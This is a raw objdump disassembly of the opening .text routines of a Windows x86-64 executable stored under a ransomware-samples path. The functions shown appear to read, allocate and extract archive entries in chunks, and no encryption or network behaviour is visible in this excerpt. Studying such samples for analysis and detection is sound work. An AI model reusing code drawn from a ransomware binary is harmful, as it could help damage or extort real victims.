
malware_samples/ransomware/356d5298be16003b7ef9b8c82a520d156d7fbd6e59a0f381048ad4e99453541b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001005:	57                   	push   %rdi
   140001006:	48 83 ec 20          	sub    $0x20,%rsp
   14000100a:	8b f9                	mov    %ecx,%edi
   14000100c:	e8 9f eb 00 00       	call   0x14000fbb0
   140001011:	48 8b 18             	mov    (%rax),%rbx
   140001014:	e8 8f eb 00 00       	call   0x14000fba8
   140001019:	48 8b d3             	mov    %rbx,%rdx
   14000101c:	8b 08                	mov    (%rax),%ecx
   14000101e:	e8 ad 6b 00 00       	call   0x140007bd0
   140001023:	48 8b d0             	mov    %rax,%rdx
   140001026:	8b cf                	mov    %edi,%ecx
   140001028:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000102d:	48 83 c4 20          	add    $0x20,%rsp
   140001031:	5f                   	pop    %rdi
   140001032:	e9 59 1a 00 00       	jmp    0x140002a90
   140001037:	cc                   	int3
   140001038:	cc                   	int3
   140001039:	cc                   	int3
   14000103a:	cc                   	int3
   14000103b:	cc                   	int3
   14000103c:	cc                   	int3
   14000103d:	cc                   	int3
   14000103e:	cc                   	int3
   14000103f:	cc                   	int3
   140001040:	48 8d 05 51 23 04 00 	lea    0x42351(%rip),%rax        # 0x140043398
   140001047:	c3                   	ret
   140001048:	cc                   	int3
   140001049:	cc                   	int3
   14000104a:	cc                   	int3
   14000104b:	cc                   	int3
   14000104c:	cc                   	int3
   14000104d:	cc                   	int3
   14000104e:	cc                   	int3
   14000104f:	cc                   	int3
   140001050:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001055:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000105a:	53                   	push   %rbx
   14000105b:	55                   	push   %rbp
   14000105c:	56                   	push   %rsi
   14000105d:	57                   	push   %rdi
   14000105e:	41 56                	push   %r14
   140001060:	41 57                	push   %r15
   140001062:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140001069:	33 c0                	xor    %eax,%eax
   14000106b:	4d 8b f0             	mov    %r8,%r14
   14000106e:	48 8b da             	mov    %rdx,%rbx
   140001071:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001076:	48 8b f9             	mov    %rcx,%rdi
   140001079:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000107e:	48 8d 15 2b c5 02 00 	lea    0x2c52b(%rip),%rdx        # 0x14002d5b0
   140001085:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000108a:	44 8d 40 58          	lea    0x58(%rax),%r8d
   14000108e:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140001092:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001097:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000109c:	49 8b f1             	mov    %r9,%rsi
   14000109f:	8b e8                	mov    %eax,%ebp
   1400010a1:	e8 2a 9c 00 00       	call   0x14000acd0
   1400010a6:	44 8b f8             	mov    %eax,%r15d
   1400010a9:	85 c0                	test   %eax,%eax
   1400010ab:	74 26                	je     0x1400010d3
   1400010ad:	48 8d 53 12          	lea    0x12(%rbx),%rdx
   1400010b1:	44 8b c0             	mov    %eax,%r8d
   1400010b4:	48 8d 0d 05 c5 02 00 	lea    0x2c505(%rip),%rcx        # 0x14002d5c0
   1400010bb:	e8 40 0f 00 00       	call   0x140002000
   1400010c0:	8d 45 ff             	lea    -0x1(%rbp),%eax
   1400010c3:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400010ca:	41 5f                	pop    %r15
   1400010cc:	41 5e                	pop    %r14
   1400010ce:	5f                   	pop    %rdi
   1400010cf:	5e                   	pop    %rsi
   1400010d0:	5d                   	pop    %rbp
   1400010d1:	5b                   	pop    %rbx
   1400010d2:	c3                   	ret
   1400010d3:	b9 00 20 00 00       	mov    $0x2000,%ecx
   1400010d8:	4c 89 ac 24 80 00 00 	mov    %r13,0x80(%rsp)
   1400010df:	00 
   1400010e0:	e8 37 48 01 00       	call   0x14001591c
   1400010e5:	4c 8b e8             	mov    %rax,%r13
   1400010e8:	48 85 c0             	test   %rax,%rax
   1400010eb:	75 1c                	jne    0x140001109
   1400010ed:	4c 8d 43 12          	lea    0x12(%rbx),%r8
   1400010f1:	48 8d 15 18 c5 02 00 	lea    0x2c518(%rip),%rdx        # 0x14002d610
   1400010f8:	48 8d 0d 55 c5 02 00 	lea    0x2c555(%rip),%rcx        # 0x14002d654
   1400010ff:	e8 bc 0e 00 00       	call   0x140001fc0
   140001104:	e9 5b 01 00 00       	jmp    0x140001264
   140001109:	b9 00 20 00 00       	mov    $0x2000,%ecx
   14000110e:	e8 09 48 01 00       	call   0x14001591c
   140001113:	48 8b e8             	mov    %rax,%rbp
   140001116:	48 85 c0             	test   %rax,%rax
   140001119:	75 1c                	jne    0x140001137
   14000111b:	4c 8d 43 12          	lea    0x12(%rbx),%r8
   14000111f:	48 8d 15 3a c5 02 00 	lea    0x2c53a(%rip),%rdx        # 0x14002d660
   140001126:	48 8d 0d 27 c5 02 00 	lea    0x2c527(%rip),%rcx        # 0x14002d654
   14000112d:	e8 8e 0e 00 00       	call   0x140001fc0
   140001132:	e9 2d 01 00 00       	jmp    0x140001264
   140001137:	4c 89 a4 24 d0 00 00 	mov    %r12,0xd0(%rsp)
   14000113e:	00 
   14000113f:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   140001145:	44 8b 63 08          	mov    0x8(%rbx),%r12d
   140001149:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001150:	b8 00 20 00 00       	mov    $0x2000,%eax
   140001155:	49 8b dc             	mov    %r12,%rbx
   140001158:	4c 3b e0             	cmp    %rax,%r12
   14000115b:	4c 8b cf             	mov    %rdi,%r9
   14000115e:	ba 01 00 00 00       	mov    $0x1,%edx
   140001163:	49 8b cd             	mov    %r13,%rcx
   140001166:	48 0f 47 d8          	cmova  %rax,%rbx
   14000116a:	4c 8b c3             	mov    %rbx,%r8
   14000116d:	e8 ba ef 00 00       	call   0x14001012c
   140001172:	48 3b c3             	cmp    %rbx,%rax
   140001175:	0f 85 e1 00 00 00    	jne    0x14000125c
   14000117b:	48 8b cf             	mov    %rdi,%rcx
   14000117e:	e8 1d ed 00 00       	call   0x14000fea0
   140001183:	85 c0                	test   %eax,%eax
   140001185:	0f 85 d1 00 00 00    	jne    0x14000125c
   14000118b:	4c 2b e3             	sub    %rbx,%r12
   14000118e:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001192:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140001197:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000119e:	00 00 
   1400011a0:	bb 00 20 00 00       	mov    $0x2000,%ebx
   1400011a5:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1400011aa:	33 d2                	xor    %edx,%edx
   1400011ac:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   1400011b0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400011b5:	e8 56 7f 00 00       	call   0x140009110
   1400011ba:	8b f8                	mov    %eax,%edi
   1400011bc:	41 bf ff ff ff ff    	mov    $0xffffffff,%r15d
   1400011c2:	8d 48 04             	lea    0x4(%rax),%ecx
   1400011c5:	83 f9 02             	cmp    $0x2,%ecx
   1400011c8:	76 77                	jbe    0x140001241
   1400011ca:	83 f8 02             	cmp    $0x2,%eax
   1400011cd:	74 6d                	je     0x14000123c
   1400011cf:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   1400011d3:	48 2b d9             	sub    %rcx,%rbx
   1400011d6:	4d 85 f6             	test   %r14,%r14
   1400011d9:	74 28                	je     0x140001203
   1400011db:	4d 8b ce             	mov    %r14,%r9
   1400011de:	41 8d 57 02          	lea    0x2(%r15),%edx
   1400011e2:	4c 8b c3             	mov    %rbx,%r8
   1400011e5:	48 8b cd             	mov    %rbp,%rcx
   1400011e8:	e8 7f f6 00 00       	call   0x14001086c
   1400011ed:	48 3b c3             	cmp    %rbx,%rax
   1400011f0:	75 0c                	jne    0x1400011fe
   1400011f2:	49 8b ce             	mov    %r14,%rcx
   1400011f5:	e8 a6 ec 00 00       	call   0x14000fea0
   1400011fa:	85 c0                	test   %eax,%eax
   1400011fc:	74 1b                	je     0x140001219
   1400011fe:	41 8b ff             	mov    %r15d,%edi
   140001201:	eb 3e                	jmp    0x140001241
   140001203:	48 85 f6             	test   %rsi,%rsi
   140001206:	74 11                	je     0x140001219
   140001208:	4c 8b c3             	mov    %rbx,%r8
   14000120b:	48 8b d5             	mov    %rbp,%rdx
   14000120e:	48 8b ce             	mov    %rsi,%rcx
   140001211:	e8 5a 9e 02 00       	call   0x14002b070
   140001216:	48 03 f3             	add    %rbx,%rsi
   140001219:	83 7c 24 38 00       	cmpl   $0x0,0x38(%rsp)
   14000121e:	74 80                	je     0x1400011a0
   140001220:	83 ff 01             	cmp    $0x1,%edi
   140001223:	74 12                	je     0x140001237
   140001225:	4d 85 e4             	test   %r12,%r12
   140001228:	74 17                	je     0x140001241
   14000122a:	48 8b bc 24 c0 00 00 	mov    0xc0(%rsp),%rdi
   140001231:	00 
   140001232:	e9 19 ff ff ff       	jmp    0x140001150
   140001237:	45 33 ff             	xor    %r15d,%r15d
   14000123a:	eb 20                	jmp    0x14000125c
   14000123c:	bf fd ff ff ff       	mov    $0xfffffffd,%edi
   140001241:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
   140001248:	00 
   140001249:	48 8d 0d 60 c4 02 00 	lea    0x2c460(%rip),%rcx        # 0x14002d6b0
   140001250:	48 83 c2 12          	add    $0x12,%rdx
   140001254:	44 8b c7             	mov    %edi,%r8d
   140001257:	e8 a4 0d 00 00       	call   0x140002000
   14000125c:	4c 8b a4 24 d0 00 00 	mov    0xd0(%rsp),%r12
   140001263:	00 
   140001264:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001269:	e8 42 97 00 00       	call   0x14000a9b0
   14000126e:	49 8b cd             	mov    %r13,%rcx
   140001271:	e8 92 46 01 00       	call   0x140015908
   140001276:	48 8b cd             	mov    %rbp,%rcx
   140001279:	e8 8a 46 01 00       	call   0x140015908
   14000127e:	4c 8b ac 24 80 00 00 	mov    0x80(%rsp),%r13
   140001285:	00 
   140001286:	41 8b c7             	mov    %r15d,%eax
   140001289:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140001290:	41 5f                	pop    %r15
   140001292:	41 5e                	pop    %r14
   140001294:	5f                   	pop    %rdi
   140001295:	5e                   	pop    %rsi
   140001296:	5d                   	pop    %rbp
   140001297:	5b                   	pop    %rbx
   140001298:	c3                   	ret
   140001299:	cc                   	int3
   14000129a:	cc                   	int3
   14000129b:	cc                   	int3
   14000129c:	cc                   	int3
   14000129d:	cc                   	int3
   14000129e:	cc                   	int3
   14000129f:	cc                   	int3
   1400012a0:	40 53                	rex push %rbx
   1400012a2:	55                   	push   %rbp
   1400012a3:	56                   	push   %rsi
   1400012a4:	41 55                	push   %r13
   1400012a6:	41 56                	push   %r14
   1400012a8:	b8 50 10 00 00       	mov    $0x1050,%eax
   1400012ad:	e8 8e a1 00 00       	call   0x14000b440
   1400012b2:	48 2b e0             	sub    %rax,%rsp
   1400012b5:	48 8b 05 84 ed 03 00 	mov    0x3ed84(%rip),%rax        # 0x140040040
   1400012bc:	48 33 c4             	xor    %rsp,%rax
   1400012bf:	48 89 84 24 30 10 00 	mov    %rax,0x1030(%rsp)
   1400012c6:	00 
   1400012c7:	48 8b f2             	mov    %rdx,%rsi
   1400012ca:	4c 8b e9             	mov    %rcx,%r13
   1400012cd:	48 83 c1 70          	add    $0x70,%rcx
   1400012d1:	48 8d 15 dc c4 02 00 	lea    0x2c4dc(%rip),%rdx        # 0x14002d7b4
   1400012d8:	bd ff ff ff ff       	mov    $0xffffffff,%ebp
   1400012dd:	e8 0e 1f 00 00       	call   0x1400031f0
   1400012e2:	4c 8b f0             	mov    %rax,%r14
   1400012e5:	48 85 c0             	test   %rax,%rax
   1400012e8:	75 17                	jne    0x140001301
   1400012ea:	48 8d 56 12          	lea    0x12(%rsi),%rdx
   1400012ee:	48 8d 0d c3 c4 02 00 	lea    0x2c4c3(%rip),%rcx        # 0x14002d7b8
   1400012f5:	e8 06 0d 00 00       	call   0x140002000
   1400012fa:	33 db                	xor    %ebx,%ebx
   1400012fc:	e9 29 01 00 00       	jmp    0x14000142a
   140001301:	8b 56 04             	mov    0x4(%rsi),%edx
   140001304:	45 33 c0             	xor    %r8d,%r8d
   140001307:	49 03 55 00          	add    0x0(%r13),%rdx
   14000130b:	49 8b ce             	mov    %r14,%rcx
   14000130e:	e8 51 f1 00 00       	call   0x140010464
   140001313:	85 c0                	test   %eax,%eax
   140001315:	79 26                	jns    0x14000133d
   140001317:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   14000131b:	48 8d 15 ce c4 02 00 	lea    0x2c4ce(%rip),%rdx        # 0x14002d7f0
   140001322:	48 8d 0d 03 c5 02 00 	lea    0x2c503(%rip),%rcx        # 0x14002d82c
   140001329:	e8 92 0c 00 00       	call   0x140001fc0
   14000132e:	49 8b ce             	mov    %r14,%rcx
   140001331:	e8 a6 ea 00 00       	call   0x14000fddc
   140001336:	33 db                	xor    %ebx,%ebx
   140001338:	e9 ed 00 00 00       	jmp    0x14000142a
   14000133d:	8b 4e 0c             	mov    0xc(%rsi),%ecx
   140001340:	4c 89 a4 24 48 10 00 	mov    %r12,0x1048(%rsp)
   140001347:	00 
   140001348:	e8 cf 45 01 00       	call   0x14001591c
   14000134d:	4c 8b e0             	mov    %rax,%r12
   140001350:	48 8b d8             	mov    %rax,%rbx
   140001353:	48 85 c0             	test   %rax,%rax
   140001356:	75 28                	jne    0x140001380
   140001358:	44 8b 4e 0c          	mov    0xc(%rsi),%r9d
   14000135c:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   140001360:	48 8d 15 d9 c4 02 00 	lea    0x2c4d9(%rip),%rdx        # 0x14002d840
   140001367:	48 8d 0d e6 c2 02 00 	lea    0x2c2e6(%rip),%rcx        # 0x14002d654
   14000136e:	e8 4d 0c 00 00       	call   0x140001fc0
   140001373:	49 8b ce             	mov    %r14,%rcx
   140001376:	e8 61 ea 00 00       	call   0x14000fddc
   14000137b:	e9 a2 00 00 00       	jmp    0x140001422
   140001380:	80 7e 10 01          	cmpb   $0x1,0x10(%rsi)
   140001384:	48 89 bc 24 90 10 00 	mov    %rdi,0x1090(%rsp)
   14000138b:	00 
   14000138c:	4c 89 bc 24 40 10 00 	mov    %r15,0x1040(%rsp)
   140001393:	00 
   140001394:	0f 85 b9 00 00 00    	jne    0x140001453
   14000139a:	4d 8b cc             	mov    %r12,%r9
   14000139d:	45 33 c0             	xor    %r8d,%r8d
   1400013a0:	48 8b d6             	mov    %rsi,%rdx
   1400013a3:	49 8b ce             	mov    %r14,%rcx
   1400013a6:	e8 a5 fc ff ff       	call   0x140001050
   1400013ab:	85 c0                	test   %eax,%eax
   1400013ad:	0f 85 14 01 00 00    	jne    0x1400014c7
   1400013b3:	49 8b ce             	mov    %r14,%rcx
   1400013b6:	48 83 c6 12          	add    $0x12,%rsi
   1400013ba:	e8 1d ea 00 00       	call   0x14000fddc
   1400013bf:	48 8b d6             	mov    %rsi,%rdx
   1400013c2:	49 8d 8d 70 30 00 00 	lea    0x3070(%r13),%rcx
   1400013c9:	e8 c2 57 00 00       	call   0x140006b90
   1400013ce:	85 c0                	test   %eax,%eax
   1400013d0:	78 40                	js     0x140001412
   1400013d2:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   1400013d7:	4d 8d 8d 70 30 00 00 	lea    0x3070(%r13),%r9
   1400013de:	4c 8d 05 9f c4 02 00 	lea    0x2c49f(%rip),%r8        # 0x14002d884
   1400013e5:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400013ec:	00 
   1400013ed:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400013f2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400013f7:	e8 e4 0a 00 00       	call   0x140001ee0
   1400013fc:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140001401:	7d 0f                	jge    0x140001412
   140001403:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001408:	49 8b cc             	mov    %r12,%rcx
   14000140b:	e8 e0 1f 00 00       	call   0x1400033f0
   140001410:	8b e8                	mov    %eax,%ebp
   140001412:	48 8b bc 24 90 10 00 	mov    0x1090(%rsp),%rdi
   140001419:	00 
   14000141a:	4c 8b bc 24 40 10 00 	mov    0x1040(%rsp),%r15
   140001421:	00 
   140001422:	4c 8b a4 24 48 10 00 	mov    0x1048(%rsp),%r12
   140001429:	00 
   14000142a:	48 8b cb             	mov    %rbx,%rcx
   14000142d:	e8 d6 44 01 00       	call   0x140015908
   140001432:	8b c5                	mov    %ebp,%eax
   140001434:	48 8b 8c 24 30 10 00 	mov    0x1030(%rsp),%rcx
   14000143b:	00 
   14000143c:	48 33 cc             	xor    %rsp,%rcx
   14000143f:	e8 5c a0 00 00       	call   0x14000b4a0
   140001444:	48 81 c4 50 10 00 00 	add    $0x1050,%rsp
   14000144b:	41 5e                	pop    %r14
   14000144d:	41 5d                	pop    %r13
   14000144f:	5e                   	pop    %rsi
   140001450:	5d                   	pop    %rbp
   140001451:	5b                   	pop    %rbx
   140001452:	c3                   	ret
   140001453:	8b 7e 0c             	mov    0xc(%rsi),%edi
   140001456:	4d 8b fc             	mov    %r12,%r15
   140001459:	48 85 ff             	test   %rdi,%rdi
   14000145c:	0f 84 51 ff ff ff    	je     0x1400013b3
   140001462:	b8 00 20 00 00       	mov    $0x2000,%eax
   140001467:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000146e:	00 00 
   140001470:	48 3b f8             	cmp    %rax,%rdi
   140001473:	48 8b ef             	mov    %rdi,%rbp
   140001476:	4d 8b ce             	mov    %r14,%r9
   140001479:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000147f:	48 0f 47 e8          	cmova  %rax,%rbp
   140001483:	49 8b cf             	mov    %r15,%rcx
   140001486:	48 8b d5             	mov    %rbp,%rdx
   140001489:	e8 9e ec 00 00       	call   0x14001012c
   14000148e:	48 83 f8 01          	cmp    $0x1,%rax
   140001492:	72 17                	jb     0x1400014ab
   140001494:	4c 03 fd             	add    %rbp,%r15
   140001497:	b8 00 20 00 00       	mov    $0x2000,%eax
   14000149c:	48 2b fd             	sub    %rbp,%rdi
   14000149f:	75 cf                	jne    0x140001470
   1400014a1:	bd ff ff ff ff       	mov    $0xffffffff,%ebp
   1400014a6:	e9 08 ff ff ff       	jmp    0x1400013b3
   1400014ab:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   1400014af:	48 8d 15 82 c2 02 00 	lea    0x2c282(%rip),%rdx        # 0x14002d738
   1400014b6:	48 8d 0d af c2 02 00 	lea    0x2c2af(%rip),%rcx        # 0x14002d76c
   1400014bd:	e8 fe 0a 00 00       	call   0x140001fc0
   1400014c2:	bd ff ff ff ff       	mov    $0xffffffff,%ebp
   1400014c7:	49 8b cc             	mov    %r12,%rcx
   1400014ca:	e8 39 44 01 00       	call   0x140015908
   1400014cf:	49 8b ce             	mov    %r14,%rcx
   1400014d2:	e8 05 e9 00 00       	call   0x14000fddc
   1400014d7:	33 db                	xor    %ebx,%ebx
   1400014d9:	e9 34 ff ff ff       	jmp    0x140001412
   1400014de:	cc                   	int3
   1400014df:	cc                   	int3
   1400014e0:	40 57                	rex push %rdi
   1400014e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400014e6:	83 b9 74 50 00 00 01 	cmpl   $0x1,0x5074(%rcx)
   1400014ed:	48 8b f9             	mov    %rcx,%rdi
   1400014f0:	0f 84 83 00 00 00    	je     0x140001579
   1400014f6:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400014fb:	48 8b 59 08          	mov    0x8(%rcx),%rbx
   1400014ff:	48 3b 59 10          	cmp    0x10(%rcx),%rbx
   140001503:	73 2c                	jae    0x140001531
   140001505:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   140001509:	75 1a                	jne    0x140001525
   14000150b:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   14000150f:	41 b8 12 00 00 00    	mov    $0x12,%r8d
   140001515:	48 8d 15 1c c5 02 00 	lea    0x2c51c(%rip),%rdx        # 0x14002da38
   14000151c:	e8 bf 45 01 00       	call   0x140015ae0
   140001521:	85 c0                	test   %eax,%eax
   140001523:	74 3a                	je     0x14000155f
   140001525:	48 63 03             	movslq (%rbx),%rax
   140001528:	48 03 d8             	add    %rax,%rbx
   14000152b:	48 3b 5f 10          	cmp    0x10(%rdi),%rbx
   14000152f:	72 d4                	jb     0x140001505
   140001531:	33 d2                	xor    %edx,%edx
   140001533:	48 8d 8f 70 30 00 00 	lea    0x3070(%rdi),%rcx
   14000153a:	e8 e1 57 00 00       	call   0x140006d20
   14000153f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001544:	85 c0                	test   %eax,%eax
   140001546:	75 27                	jne    0x14000156f
   140001548:	48 8d 0d 01 c5 02 00 	lea    0x2c501(%rip),%rcx        # 0x14002da50
   14000154f:	e8 ac 0a 00 00       	call   0x140002000
   140001554:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001559:	48 83 c4 20          	add    $0x20,%rsp
   14000155d:	5f                   	pop    %rdi
   14000155e:	c3                   	ret
   14000155f:	80 7b 24 00          	cmpb   $0x0,0x24(%rbx)
   140001563:	48 8d 53 24          	lea    0x24(%rbx),%rdx
   140001567:	74 ca                	je     0x140001533
   140001569:	48 8d 53 25          	lea    0x25(%rbx),%rdx
   14000156d:	eb c4                	jmp    0x140001533
   14000156f:	c7 87 74 50 00 00 01 	movl   $0x1,0x5074(%rdi)
   140001576:	00 00 00 
   140001579:	33 c0                	xor    %eax,%eax
   14000157b:	48 83 c4 20          	add    $0x20,%rsp
   14000157f:	5f                   	pop    %rdi
   140001580:	c3                   	ret
   140001581:	cc                   	int3
   140001582:	cc                   	int3
   140001583:	cc                   	int3
   140001584:	cc                   	int3
   140001585:	cc                   	int3
   140001586:	cc                   	int3
   140001587:	cc                   	int3
   140001588:	cc                   	int3
   140001589:	cc                   	int3
   14000158a:	cc                   	int3
   14000158b:	cc                   	int3
   14000158c:	cc                   	int3
   14000158d:	cc                   	int3
   14000158e:	cc                   	int3
   14000158f:	cc                   	int3
   140001590:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001595:	56                   	push   %rsi
   140001596:	41 56                	push   %r14
   140001598:	41 57                	push   %r15
   14000159a:	48 83 ec 20          	sub    $0x20,%rsp
   14000159e:	48 8b f2             	mov    %rdx,%rsi
   1400015a1:	48 8b d9             	mov    %rcx,%rbx
   1400015a4:	48 83 c1 70          	add    $0x70,%rcx
   1400015a8:	48 8d 15 05 c2 02 00 	lea    0x2c205(%rip),%rdx        # 0x14002d7b4
   1400015af:	45 33 f6             	xor    %r14d,%r14d
   1400015b2:	e8 39 1c 00 00       	call   0x1400031f0
   1400015b7:	4c 8b f8             	mov    %rax,%r15
   1400015ba:	48 85 c0             	test   %rax,%rax
   1400015bd:	75 21                	jne    0x1400015e0
   1400015bf:	48 8d 56 12          	lea    0x12(%rsi),%rdx
   1400015c3:	48 8d 0d ee c1 02 00 	lea    0x2c1ee(%rip),%rcx        # 0x14002d7b8
   1400015ca:	e8 31 0a 00 00       	call   0x140002000
   1400015cf:	33 c0                	xor    %eax,%eax
   1400015d1:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400015d6:	48 83 c4 20          	add    $0x20,%rsp
   1400015da:	41 5f                	pop    %r15
   1400015dc:	41 5e                	pop    %r14
   1400015de:	5e                   	pop    %rsi
   1400015df:	c3                   	ret
   1400015e0:	8b 56 04             	mov    0x4(%rsi),%edx
   1400015e3:	45 33 c0             	xor    %r8d,%r8d
   1400015e6:	48 03 13             	add    (%rbx),%rdx
   1400015e9:	49 8b cf             	mov    %r15,%rcx
   1400015ec:	e8 73 ee 00 00       	call   0x140010464
   1400015f1:	85 c0                	test   %eax,%eax
   1400015f3:	79 1c                	jns    0x140001611
   1400015f5:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   1400015f9:	48 8d 15 f0 c1 02 00 	lea    0x2c1f0(%rip),%rdx        # 0x14002d7f0
   140001600:	48 8d 0d 25 c2 02 00 	lea    0x2c225(%rip),%rcx        # 0x14002d82c
   140001607:	e8 b4 09 00 00       	call   0x140001fc0
   14000160c:	e9 ce 00 00 00       	jmp    0x1400016df
   140001611:	8b 4e 0c             	mov    0xc(%rsi),%ecx
   140001614:	e8 03 43 01 00       	call   0x14001591c
   140001619:	4c 8b f0             	mov    %rax,%r14
   14000161c:	48 85 c0             	test   %rax,%rax
   14000161f:	75 20                	jne    0x140001641
   140001621:	44 8b 4e 0c          	mov    0xc(%rsi),%r9d
   140001625:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   140001629:	48 8d 15 10 c2 02 00 	lea    0x2c210(%rip),%rdx        # 0x14002d840
   140001630:	48 8d 0d 1d c0 02 00 	lea    0x2c01d(%rip),%rcx        # 0x14002d654
   140001637:	e8 84 09 00 00       	call   0x140001fc0
   14000163c:	e9 9e 00 00 00       	jmp    0x1400016df
   140001641:	80 7e 10 01          	cmpb   $0x1,0x10(%rsi)
   140001645:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   14000164a:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   14000164f:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   140001654:	75 17                	jne    0x14000166d
   140001656:	4d 8b ce             	mov    %r14,%r9
   140001659:	45 33 c0             	xor    %r8d,%r8d
   14000165c:	48 8b d6             	mov    %rsi,%rdx
   14000165f:	49 8b cf             	mov    %r15,%rcx
   140001662:	e8 e9 f9 ff ff       	call   0x140001050
   140001667:	85 c0                	test   %eax,%eax
   140001669:	74 65                	je     0x1400016d0
   14000166b:	eb 58                	jmp    0x1400016c5
   14000166d:	8b 5e 0c             	mov    0xc(%rsi),%ebx
   140001670:	49 8b ee             	mov    %r14,%rbp
   140001673:	48 85 db             	test   %rbx,%rbx
   140001676:	74 58                	je     0x1400016d0
   140001678:	41 bc 00 20 00 00    	mov    $0x2000,%r12d
   14000167e:	66 90                	xchg   %ax,%ax
   140001680:	49 3b dc             	cmp    %r12,%rbx
   140001683:	48 8b fb             	mov    %rbx,%rdi
   140001686:	4d 8b cf             	mov    %r15,%r9
   140001689:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000168f:	49 0f 47 fc          	cmova  %r12,%rdi
   140001693:	48 8b cd             	mov    %rbp,%rcx
   140001696:	48 8b d7             	mov    %rdi,%rdx
   140001699:	e8 8e ea 00 00       	call   0x14001012c
   14000169e:	48 83 f8 01          	cmp    $0x1,%rax
   1400016a2:	72 0a                	jb     0x1400016ae
   1400016a4:	48 03 ef             	add    %rdi,%rbp
   1400016a7:	48 2b df             	sub    %rdi,%rbx
   1400016aa:	75 d4                	jne    0x140001680
   1400016ac:	eb 22                	jmp    0x1400016d0
   1400016ae:	4c 8d 46 12          	lea    0x12(%rsi),%r8
   1400016b2:	48 8d 15 7f c0 02 00 	lea    0x2c07f(%rip),%rdx        # 0x14002d738
   1400016b9:	48 8d 0d ac c0 02 00 	lea    0x2c0ac(%rip),%rcx        # 0x14002d76c
   1400016c0:	e8 fb 08 00 00       	call   0x140001fc0
   1400016c5:	49 8b ce             	mov    %r14,%rcx
   1400016c8:	e8 3b 42 01 00       	call   0x140015908
   1400016cd:	45 33 f6             	xor    %r14d,%r14d
   1400016d0:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400016d5:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400016da:	4c 8b 64 24 50       	mov    0x50(%rsp),%r12
   1400016df:	49 8b cf             	mov    %r15,%rcx
   1400016e2:	e8 f5 e6 00 00       	call   0x14000fddc
   1400016e7:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400016ec:	49 8b c6             	mov    %r14,%rax
   1400016ef:	48 83 c4 20          	add    $0x20,%rsp
   1400016f3:	41 5f                	pop    %r15
   1400016f5:	41 5e                	pop    %r14
   1400016f7:	5e                   	pop    %rsi
   1400016f8:	c3                   	ret
   1400016f9:	cc                   	int3
   1400016fa:	cc                   	int3
   1400016fb:	cc                   	int3
   1400016fc:	cc                   	int3
   1400016fd:	cc                   	int3
   1400016fe:	cc                   	int3
   1400016ff:	cc                   	int3
   140001700:	40 53                	rex push %rbx
   140001702:	57                   	push   %rdi
   140001703:	48 83 ec 38          	sub    $0x38,%rsp
   140001707:	83 b9 74 50 00 00 01 	cmpl   $0x1,0x5074(%rcx)
   14000170e:	48 8b fa             	mov    %rdx,%rdi
   140001711:	48 8b d9             	mov    %rcx,%rbx
   140001714:	74 18                	je     0x14000172e
   140001716:	48 8d 0d 73 c1 02 00 	lea    0x2c173(%rip),%rcx        # 0x14002d890
   14000171d:	e8 de 08 00 00       	call   0x140002000
   140001722:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001727:	48 83 c4 38          	add    $0x38,%rsp
   14000172b:	5f                   	pop    %rdi
   14000172c:	5b                   	pop    %rbx
   14000172d:	c3                   	ret
   14000172e:	80 7a 11 6e          	cmpb   $0x6e,0x11(%rdx)
   140001732:	75 24                	jne    0x140001758
   140001734:	e8 67 fb ff ff       	call   0x1400012a0
   140001739:	8b d8                	mov    %eax,%ebx
